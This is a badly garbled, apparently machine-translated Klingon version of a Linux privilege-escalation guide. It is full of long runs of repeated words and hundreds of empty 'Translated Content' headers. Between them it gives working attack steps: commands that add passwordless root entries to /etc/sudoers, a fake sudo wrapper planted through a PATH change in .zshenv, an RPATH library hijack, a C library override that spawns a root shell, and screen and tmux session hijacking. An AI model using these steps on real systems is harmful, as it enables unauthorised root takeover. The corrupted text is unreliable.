**vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
**ghItlhvam**:
jImej, vaj jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq jImejDaq j
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
**Another way to abuse these permissions:**

**Klingon Translation:**

**vItlhutlh:** *ghaH 'ej vItlhutlh:*
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary vItlhutlh `doas` vItlhutlh OpenBSD, `/etc/doas.conf` Daq vItlhutlh vItlhutlh configuration.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

**QaH** vItlhutlh **user** **machine** **sudo** **'ej** **privileges** **escalate** **ghItlh** **shell** **user** **context**, **sudo** **executable** **new** **create** **jImej** **root** **code** **'ej** **user's** **command** **'ej** **execute**. **$PATH** **user** **context** **modify** (for example **path** **new** **add** **.bash\_profile**) **user** **sudo** **execute** **user's** **sudo** **executable** **execute**.

**user** **different** **shell** (bash **not**) **modify** **files** **other** **new** **path** **add** **need**. **Example** **another** **find** **can** **bashdoor.py** **[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)** **example** **another** **find** **can** **.bashrc**, **.zshrc**, **.bash\_profile** **~/.bashrc**, **~/.zshrc**, **~/.bash_profile** **modify** **sudo-piggyback** **[sudo-piggyback](https://github.com/APTy/sudo-piggyback)** **example**.

**'ej** **running** **something** **like**:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

`/etc/ld.so.conf` file: **tlhIngan Hol translation not available**

`include /etc/ld.so.conf.d/*.conf` path: **tlhIngan Hol translation not available**

`/etc/ld.so.conf.d/*.conf` configuration files: **tlhIngan Hol translation not available**

`/etc/ld.so.conf.d/libc.conf` content: **tlhIngan Hol translation not available**

`/usr/local/lib` folder: **tlhIngan Hol translation not available**

If a user has write permissions on any of the following paths: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/`, or any folder within the config file inside `/etc/ld.so.conf.d/*.conf`, they may be able to escalate privileges.\
For information on how to exploit this misconfiguration, refer to the following page:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH: **tlhIngan Hol translation not available**
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
**By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.**

**tlhIngan Hol translation:**

`/var/tmp/flag15/` vItlhutlhlaHbe'chugh, 'ej vaj RPATH lo'laHbe'chugh, 'op program vItlhutlhlaHbe'.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content

```
### Translated Content
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Get** files with specific ACLs from the system:

**Qap** vItlhutlh **files** jatlhpu' **specific ACLs** vItlhutlh **system**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## qo' vItlhutlh

**Quch** **qay'be'** **shell** **vItlhutlh** **root** **user** **vItlhutlh** **shell** **session** **Hijack** **jatlh**.\
**Quch** **qay'be'** **user** **screen** **session** **connect** **jatlh**. **Quch** **qay'be'** **session** **inside** **information** **interesting** **le'**.

### **List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**QapHa'**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

**tlhIngan Hol:**
**vItlhutlh:** **tmux versions** **qel** **ghu'vam** **vItlhutlh**. **root** **tlhIngan Hol:**
**vItlhutlh** **vItlhutlh** **tmux (v2.1)** **vItlhutlh** **non-privileged user** **vItlhutlh** **vItlhutlh**.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**QapHa'**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**Valentine box from HTB** qIb **example**.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 **may be affected by this bug**.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

* **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
* **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
* **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

* `yes`: root can login using password and private key
* `without-password` or `prohibit-password`: root can only login with a private key
* `forced-commands-only`: Root can login only using private key and if the commands options are specified
* `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
**DajatlhlaH** vItlhutlh **private** key **testusername** user **login** **attempt** **indicate** configuration **ghaH**. **SSH** **public key** **compare** **attempt** **key** **/home/testusername/.ssh/authorized_keys** **/home/testusername/access** **ghaH**.

### ForwardAgent/AllowAgentForwarding

**SSH agent forwarding** **local SSH keys** **use** **allow** **instead** **key** (passphrases!) **server** **sit**. **So**, **ssh** **jump** **host** **jump** **another** **host** **use** **key** **initial host** **located**.

**$HOME/.ssh.config** **option** **set** **need** **like** **this**:
```
Host example.com
ForwardAgent yes
```
